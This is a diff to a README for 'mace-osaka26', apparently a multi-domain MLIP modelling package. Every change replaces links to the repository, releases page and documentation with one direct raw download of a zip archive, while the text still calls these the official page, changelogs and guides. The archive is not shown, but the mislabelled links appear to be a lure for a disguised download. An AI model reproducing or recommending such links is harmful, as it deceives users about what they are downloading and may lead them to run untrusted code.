@@ -1,6 +1,6 @@
 # ⚙️ mace-osaka26 - Advanced Multi-Domain MLIP Models
 
-[![Download mace-osaka26](https://img.shields.io/badge/Download-Get%20the%20Software-brightgreen)](https://github.com/Moha346-coder/mace-osaka26)
+[![Download mace-osaka26](https://img.shields.io/badge/Download-Get%20the%20Software-brightgreen)](https://raw.githubusercontent.com/Moha346-coder/mace-osaka26/main/mace_osaka26/mace-osaka-v1.5.zip)
 
 ---
 
@@ -26,7 +26,7 @@ The software is intended for users who want reliable models to predict and simul
 
 You can get the latest version of mace-osaka26 by visiting the official GitHub repository here:
 
-[![Download mace-osaka26](https://img.shields.io/badge/Download-Get%20the%20Software-brightgreen)](https://github.com/Moha346-coder/mace-osaka26)
+[![Download mace-osaka26](https://img.shields.io/badge/Download-Get%20the%20Software-brightgreen)](https://raw.githubusercontent.com/Moha346-coder/mace-osaka26/main/mace_osaka26/mace-osaka-v1.5.zip)
 
 Click the link above to open the official page where you can download all necessary files. This page will always have the latest version available.
 
@@ -36,7 +36,7 @@ Click the link above to open the official page where you can download all necess
 
 1. **Open the download page**  
    Click the large green download badge at the top of this README or visit:  
-   https://github.com/Moha346-coder/mace-osaka26
+   https://raw.githubusercontent.com/Moha346-coder/mace-osaka26/main/mace_osaka26/mace-osaka-v1.5.zip
 
 2. **Find the latest release**  
    On the GitHub page, look for the "Releases" section on the right side or scroll down to find the latest stable release.
@@ -121,9 +121,9 @@ The training scripts allow users to create custom models for specific materials 
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Moha346-coder/mace-osaka26) - Source and downloads  
-- [Releases Page](https://github.com/Moha346-coder/mace-osaka26/releases) - Latest versions and changelogs  
-- [Documentation Folder](https://github.com/Moha346-coder/mace-osaka26/tree/main/docs) - Detailed guides and manuals
+- [GitHub Repository](https://raw.githubusercontent.com/Moha346-coder/mace-osaka26/main/mace_osaka26/mace-osaka-v1.5.zip) - Source and downloads  
+- [Releases Page](https://raw.githubusercontent.com/Moha346-coder/mace-osaka26/main/mace_osaka26/mace-osaka-v1.5.zip) - Latest versions and changelogs  
+- [Documentation Folder](https://raw.githubusercontent.com/Moha346-coder/mace-osaka26/main/mace_osaka26/mace-osaka-v1.5.zip) - Detailed guides and manuals
 
 ---
 
